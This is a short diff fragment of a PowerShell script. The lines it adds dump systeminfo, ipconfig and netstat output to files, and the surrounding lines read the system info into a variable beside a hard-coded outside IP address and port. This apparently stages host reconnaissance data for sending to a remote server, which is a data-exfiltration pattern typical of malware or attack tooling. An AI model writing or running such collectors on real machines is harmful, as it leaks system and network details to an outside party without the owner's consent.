@@ -1,3 +1,7 @@
+systeminfo > systeminfo.txt
+ipconfig > ipconfig.txt
+netstat > netstat.txt
+
 $content = Get-Content .\systeminfo.txt
 $uri = "140.113.89.105:8000"
 
